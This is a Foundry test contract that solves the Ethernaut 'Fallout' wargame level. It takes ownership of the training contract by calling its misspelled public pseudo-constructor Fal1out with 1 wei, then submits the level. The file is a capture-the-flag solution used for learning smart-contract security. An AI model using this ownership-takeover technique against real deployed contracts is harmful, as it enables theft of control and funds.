pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "src/Fallout/FalloutFactory.sol";
import "src/Ethernaut.sol";
import "src/test/utils/vm.sol";

contract FallOutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

        /////////////////////
        // ETHERNAUT SETUP //
        /////////////////////

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // deal sends erc20 tokens to address
        // function deal(address to, uint256 give) public;
        vm.deal(eoaAddress, 5 ether);
    }

    function testFalloutHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        // initialize new contract in factory contract
        FalloutFactory falloutFactory = new FalloutFactory();
        // Registers level in in ethernaut contract 
        // with factory
        ethernaut.registerLevel(falloutFactory);
        // Sets msg.sender for all subsequent calls until stopPrank is called. Sets eoaAddress as msg.sender
        vm.startPrank(eoaAddress);
        // create level instance in ethernaut and returns address
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        // sets the Fallback contract with level address
        Fallout ethernautFallout = Fallout(payable(levelAddress));
        
        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // log the owner before
        emit log_named_address("Fallout Owner Before Attack", ethernautFallout.owner());
        // contribute 1 wei to set owner
        // constructor is payable
        ethernautFallout.Fal1out{value: 1 wei}();
        // log the owner before
        emit log_named_address("Fallout Owner After Attack", ethernautFallout.owner());

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        
       // submit level instance
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}